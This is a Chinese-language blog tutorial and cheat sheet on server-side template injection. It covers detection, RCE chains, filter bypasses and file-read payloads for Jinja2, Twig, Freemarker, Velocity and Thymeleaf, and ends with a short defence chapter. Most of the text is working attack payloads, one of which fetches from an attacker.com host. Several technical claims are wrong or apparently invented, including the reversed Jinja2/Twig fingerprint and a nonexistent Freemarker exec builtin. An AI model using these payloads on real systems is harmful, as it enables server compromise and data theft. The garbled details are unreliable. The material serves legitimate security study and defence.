---
title: SSTI 模板注入全解：从检测到 RCE
date: 2026-06-24 14:00:00
tags:
- SSTI
- 模板注入
- Jinja2
- Twig
- Freemarker
- RCE
categories:
- 安全研究
---

# SSTI 模板注入全解：从检测到 RCE

> 涵盖 Jinja2、Twig、Freemarker、Velocity、Thymeleaf 等主流模板引擎，系统化拆解 SSTI 检测与利用

---

## 目录

- [第1章 SSTI 概述](#第1章-ssti-概述)
- [第2章 检测与探测](#第2章-检测与探测)
- [第3章 Jinja2（Python）](#第3章-jinja2python)
- [第4章 Twig（PHP）](#第4章-twigphp)
- [第5章 Freemarker（Java）](#第5章-freemarkerjava)
- [第6章 Velocity（Java）](#第6章-velocityjava)
- [第7章 Thymeleaf（Java）](#第7章-thymeleafjava)
- [第8章 防御与修复](#第8章-防御与修复)

---

## 第1章 SSTI 概述

### 1.1 什么是模板引擎

模板引擎将**模板**（含占位符的文本）和**数据**（变量值）合并，生成最终的 HTML 或文本输出。

```
模板: <h1>Hello {{ name }}</h1>
数据: name = "admin"
输出: <h1>Hello admin</h1>
```

### 1.2 什么是 SSTI

SSTI（Server-Side Template Injection，服务端模板注入）发生在**用户输入被直接拼接到模板中**而非作为数据传入时。

```python
# ❌ 危险：用户输入被拼接到模板字符串中
template = "Hello " + user_input
render(template)

# ✅ 安全：用户输入作为变量值传入
render("Hello {{ name }}", name=user_input)
```

### 1.3 SSTI 能做什么

| 能力 | 说明 |
|------|------|
| 读取敏感数据 | 配置文件、环境变量、数据库连接信息 |
| 文件读取 | 读取服务器上的任意文件 |
| RCE | 在服务器上执行任意命令 |
| SSRF | 向内部网络发送请求 |
| 横向移动 | 读取其他模板上下文的变量 |

### 1.4 常见模板引擎

| 引擎 | 语言 | 语法特征 | 常见框架 |
|------|------|---------|---------|
| Jinja2 | Python | `{{ }}`、`{% %}` | Flask, Django |
| Twig | PHP | `{{ }}`、`{% %}` | Symfony, Drupal |
| Freemarker | Java | `${}`、`<# >` | Spring MVC |
| Velocity | Java | `${}` | Spring, Struts |
| Thymeleaf | Java | `th:text`、`[[...]]` | Spring Boot |
| Smarty | PHP | `{$var}` | Laravel |
| Pug/Jade | Node.js | `#{var}` | Express |

---

## 第2章 检测与探测

### 2.1 通用探测 Payload

在任意疑似模板注入点输入数学表达式：

```
{{7*7}}
${7*7}
#{7*7}
*{7*7}
```

如果返回 `49` 或类似计算结果，说明存在 SSTI。

### 2.2 各引擎识别

| 输入 | 预期输出 | 引擎 |
|------|---------|------|
| `{{7*7}}` | `49` | Jinja2 / Twig |
| `${7*7}` | `49` | Freemarker / Velocity |
| `#{7*7}` | `49` | Thymeleaf (默认不计算) |
| `*{7*7}` | `49` | Thymeleaf (Spring EL) |
| `{{7*'7'}}` | `49` | Jinja2（字符串乘法） |
| `{{7*'7'}}` | `7777777` | Twig（重复字符串） |

### 2.3 探测模板是否存在

```python
# Jinja2
{{config}}           → 显示 Flask 配置对象
{{self}}             → 显示当前模板对象

# Twig
{{_self}}            → 显示模板自身
{{_context}}          → 显示上下文变量

# Freemarker
${.globals}          → 显示全局变量
${.dataModel}        → 显示数据模型
```

---

## 第3章 Jinja2（Python）

### 3.1 基础语法

```jinja2
{{ variable }}       → 输出变量值
{% for x in list %}  → 控制语句
{% endif %}          → 结束
{# comment #}        → 注释
```

### 3.2 从 SSTI 到 RCE 的关键链

Jinja2 在 Python 中运行，可以通过 Python 的对象模型链从任意对象摸到 `__builtins__`：

#### 方法一：`__class__.__mro__` 链

```python
# 经典逃逸链
''.__class__.__mro__[1].__subclasses__()
```

逐步拆解：

```python
''.__class__
# <class 'str'>

''.__class__.__mro__
# (<class 'str'>, <class 'object'>)  ← 方法解析顺序

''.__class__.__mro__[1]
# <class 'object'>  ← 拿到所有类的基类

''.__class__.__mro__[1].__subclasses__()
# [<class 'type'>, <class 'weakref'>, <class 'dict'>, ...]
# ← 当前 Python 进程加载的所有类
```

#### 方法二：使用 `__builtins__`

```python
# 从任意类的 __init__.__globals__ 中拿到 __builtins__
''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']
```

### 3.3 找可用子类的自动化方法

```python
# 打印索引和类名
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
    {% if c.__name__ == 'Popen' or c.__name__ == 'os' or c.__name__ == 'builtins' %}
        {{ loop.index0 }}: {{ c.__name__ }}
    {% endif %}
{% endfor %}
```

**常用目标类**：

| 类名 | 位置 | 用途 |
|------|------|------|
| `subprocess.Popen` | 需找到索引 | 命令执行 |
| `os.wrap_close` | 包含 `os` 模块 | 通过 `__init__.__globals__` 拿到 os |
| `warnings.catch_warnings` | 常见 | 含 `__builtins__` |
| `_frozen_importlib.BuiltinImporter` | 常见 | 可加载任意模块 |

### 3.4 完整 RCE Payload

#### 找到 Popen 类

```jinja2
{% for c in ''.__class__.__mro__[1].__subclasses__() %}
    {% if c.__name__ == 'Popen' %}
        {{ c('cat /flag', shell=True, stdout=-1).communicate()[0] }}
    {% endif %}
{% endfor %}
```

#### 通过 `__builtins__` 执行

```jinja2
{% set builtins = ''.__class__.__mro__[1].__subclasses__()
     [X].__init__.__globals__['__builtins__'] %}
{{ builtins['__import__']('os').system('id') }}
```

#### 通过 `cycler` 对象（Flask/Jinja2 自带）

```jinja2
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

#### 通过 `lipsum` 对象

```jinja2
{{ lipsum.__globals__['os'].popen('id').read() }}
```

#### 通过 `joiner` 对象

```jinja2
{{ joiner.__init__.__globals__.os.popen('id').read() }}
```

### 3.5 过滤绕过

#### 过滤 `[` 和 `]` → 用 `.__getitem__()` 或 `|attr()`

```jinja2
# 替代 []
().__class__.__bases__[0]
# 等价于
().__class__.__bases__.__getitem__(0)

# 或者使用 |attr() 过滤器
{{ ''|attr('__class__') }}
```

#### 过滤 `__` → 用 `|attr()` + 拼接

```jinja2
{{ ''|attr('__cl' + 'ass__') }}
# 等价于 ''.__class__
```

#### 过滤 `class` → Unicode 编码

```jinja2
{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}
# \x5f = _，等价于 __class__
```

#### 过滤 `{{` → 改用 `{%`

某些场景下 `{{` 被过滤但 `{%` 可以：

```jinja2
{% if ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__.__builtins__.__import__('os').system('id') %}x{% endif %}
```

#### 过滤 `.` → 使用 `|attr()` 链

```jinja2
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}
```

### 3.6 常见 Flask SSTI 场景

Flask 的 `config` 对象经常包含敏感信息：

```jinja2
{{ config }}
{{ config.SECRET_KEY }}
{{ config.DATABASE_URL }}
```

通过 SSTI 读 Flask session 密钥后可以伪造 session Cookie。

---

## 第4章 Twig（PHP）

### 4.1 基础语法

```twig
{{ variable }}      输出变量值
{% if expr %}       控制语句
{# comment #}       注释
```

### 4.2 RCE Payload

#### Twig 1.x — 使用 `getAttribute`

```twig
{{ _self.env.registerUndefinedFilterCallback("exec") }}
{{ _self.env.getFilter("id") }}
```

#### Twig 2.x / 3.x — 使用 `set` + 过滤链

```twig
{% set cmd = "id" %}
{% set output = ''|split(cmd)|map('system') %}
{{ output }}
```

#### 直接调用 PHP 函数

```twig
{{ ['id']|filter('system') }}          <!-- Twig 2.x -->
{{ ['id']|map('system') }}             <!-- Twig 2.x+ -->
{{ {'id':'id'}|sort('system') }}       <!-- Twig 2.x+ -->
```

### 4.3 文件读取

```twig
{{ include('/etc/passwd') }}
{{ source('/etc/passwd') }}
```

---

## 第5章 Freemarker（Java）

### 5.1 基础语法

```ftl
${variable}          输出变量值
<#if condition>      控制语句
<#list list as item> 循环
<#assign x=1>        赋值
```

### 5.2 RCE Payload

#### 方法一：`new()` 内建函数（Freemarker 2.3.17+）

```ftl
${"freemarker.template.utility.Execute"?new()("id")}
```

#### 方法二：`exec` 内建函数（Freemarker 2.3.19+）

```ftl
${"java.lang.Runtime"?new()?.exec("id")}
```

#### 方法三：`Configuration` API

```ftl
${object?api.class.protectionDomain.codeSource.location}
```

#### 方法四：通过 `url` 连接

```ftl
<#assign uri= "http://attacker.com:8000/?cmd=id">
${uri?fetch}
```

### 5.3 文件读取

```ftl
${"freemarker.template.utility.Execute"?new()("cat /etc/passwd")}
```

或者用 Java 原生：

```ftl
${"java.io.BufferedReader"?
    new()?call("java.io.InputStreamReader"?
    new()?call("java.io.FileInputStream"?
    new()?call("/etc/passwd")))}
```

---

## 第6章 Velocity（Java）

### 6.1 基础语法

```velocity
$variable            输出变量值
${variable}          明确边界的变量引用
#set($x = 1)         赋值
#if($condition)      条件
#foreach($item in $list)  循环
```

### 6.2 RCE Payload

```velocity
#set($exec = $class.inspect("java.lang.Runtime").getRuntime().exec("id"))
$exec
```

```velocity
#set($str = $class.inspect("java.lang.String"))
#set($ch = $str.toChars(47))
## 路径遍历
#set($file = $str.valueOf($class.inspect("java.io.File").parseParams("/flag")))
```

### 6.3 绕过安全约束

Velocity 内置了事件处理机制，可以通过 `EventCartridge` 绕过：

```velocity
#set($e = $eventcartridge)
#set($e2 = $e.getClass().getDeclaredField("MIGHT_BE_ACCESSIBLE"))
$e2.setAccessible(true)
$e2.set($e, true)
```

---

## 第7章 Thymeleaf（Java）

### 7.1 基础语法

```html
<!-- 标准表达式 -->
<p th:text="${message}">默认文本</p>

<!-- 链接表达式 -->
<a th:href="@{/home}">Home</a>

<!-- 选择表达式 -->
<div th:object="${user}">
    <p th:text="*{name}">名字</p>
</div>

<!-- 片段表达式 -->
<div th:fragment="header">...</div>
```

### 7.2 SSTI 漏洞点

Thymeleaf 的 SSTI 通常出现在框架自动解析视图名时。当 `@ResponseBody` 没有正确配置，Spring 使用 `ViewResolver` 解析返回值作为模板路径时：

```java
// ❌ 危险：用户控制返回值并被当作模板解析
@RequestMapping("/hello")
public String hello(@RequestParam String name) {
    return "hello/" + name;  // → 解析为 hello/{name} 模板
}

// ✅ 安全：使用 @ResponseBody 或 ResponseEntity
@RequestMapping("/hello")
@ResponseBody
public String hello(@RequestParam String name) {
    return "hello " + name;  // → 直接返回文本
}
```

### 7.3 RCE Payload

#### Spring SpEL 表达式

```html
<!-- 在模板文件中注入 -->
<p th:text="${T(java.lang.Runtime).getRuntime().exec('id')}">test</p>
```

#### 构造 URL 参数注入

```
http://target.com/hello/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()%7d__::.x
```

URL 解码后：

```
http://target.com/hello/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
```

### 7.4 文件读取（SpringEL）

```html
<p th:text="${T(java.nio.file.Files).readString(T(java.nio.file.Paths).get('/etc/passwd'))}">x</p>
```

### 7.5 Thymeleaf 的特定防御绕过

Thymeleaf 默认转义 HTML。使用 `th:utext`（不转义）和 `th:text`（转义）的区别：

```html
th:text="${1+1}"       → 输出 2（转义后）
th:utext="${1+1}"      → 输出 2（不转义）
```

---

## 第8章 防御与修复

### 8.1 通用防御原则

1. **不要将用户输入拼接到模板字符串中** — 用户输入永远作为变量值传入，而不是模板代码的一部分。

```python
# ❌ 危险
template = "Hello " + user_input
render(template)

# ✅ 安全
render("Hello {{ name }}", name=user_input)
```

2. **使用沙箱环境** — 限制模板中可访问的对象和方法。

### 8.2 各引擎安全配置

#### Jinja2 沙箱

```python
from jinja2 import Environment, SandboxedEnvironment

# 使用沙箱环境
env = SandboxedEnvironment()
env.parse(template)

# 限制可访问的内置函数
env.globals.clear()
env.globals['allowed_func'] = some_safe_function
```

#### Twig 安全配置

```php
// 禁用危险函数
$twig = new \Twig\Environment($loader, [
    'autoescape' => true,
    'sandbox' => true,
]);

$sandbox = new \Twig\Extension\SandboxExtension(
    new \Twig\Sandbox\SecurityPolicy(
        ['if', 'for', 'set'],     // 允许的标签
        ['escape', 'upper'],      // 允许的过滤器
        ['method'],               // 允许的方法
        ['property'],             // 允许的属性
        ['function']              // 允许的函数
    )
);
$twig->addExtension($sandbox);
```

#### Freemarker 安全配置

```java
Configuration cfg = new Configuration(Configuration.VERSION_2_3_32);
cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
// SAFER_RESOLVER 会阻止 new() 调用 Execute、Runtime 等危险类
// 或者使用 ALLOWS_NOTHING_RESOLVER 完全禁用
```

#### Thymeleaf 安全配置

```java
// 禁用表达式注入
SpringTemplateEngine engine = new SpringTemplateEngine();
engine.setEnableSpringELCompiler(false);  // 禁用 SpringEL 编译
```

### 8.3 过滤输入中的模板语法

```python
import re

def sanitize_template_input(user_input):
    """移除模板语法特征"""
    # 移除 {{ }}
    sanitized = re.sub(r'\{\{.*?\}\}', '', user_input)
    # 移除 {% %}
    sanitized = re.sub(r'\{\%.*?\%\}', '', sanitized)
    # 转义 ${}
    sanitized = sanitized.replace('${', '\\${')
    return sanitized
```

---

## 附录

### A. Payload 速查表

#### 检测

```
{{7*7}} → 49 (Jinja2/Twig)
${7*7} → 49 (Freemarker/Velocity)
*{7*7} → 49 (Thymeleaf SpringEL)
```

#### Jinja2 RCE

```python
# 最短 RCE
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
# 通用链
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('os').system('id') }}
```

#### Twig RCE

```twig
{{ ['id']|filter('system') }}
{{ ['id']|map('system') }}
{{ include('/etc/passwd') }}
```

#### Freemarker RCE

```ftl
${"freemarker.template.utility.Execute"?new()("id")}
${"java.lang.Runtime"?new()?.exec("id")}
```

#### Thymeleaf RCE

```html
<p th:text="${T(java.lang.Runtime).getRuntime().exec('id')}">x</p>
```

### B. 各引擎检测指纹速查

| 输入 | Jinja2 | Twig | Freemarker | Velocity | Thymeleaf |
|------|--------|------|-----------|----------|-----------|
| `{{7*7}}` | `49` | `49` | 不变 | 不变 | 不变 |
| `${7*7}` | 不变 | 不变 | `49` | `49` | 不变 |
| `#{7*7}` | 不变 | 不变 | 不变 | 不变 | 不变 |
| `*{7*7}` | 不变 | 不变 | 不变 | 不变 | `49` |
| `{{7*'7'}}` | `49` | `7777777` | 错误 | 不变 | 不变 |

### C. CTF 常见出题套路

| 套路 | 说明 | 常见绕过 |
|------|------|---------|
| 过滤 `__` | 不能使用魔术属性 | `|attr()` 过滤器 |
| 过滤 `[` `]` | 不能下标访问 | `.__getitem__()` 或 `|first` |
| 过滤 `.` | 不能属性访问 | `|attr()` 链 |
| 过滤 `class` | 关键字被拦截 | Unicode 编码 |
| 黑名单对象 | 已知对象被封 | 找未封的替代对象（lipsum、cycler） |
| 只允许数字 | 只能输出变量 | 用字符串方法绕过 |
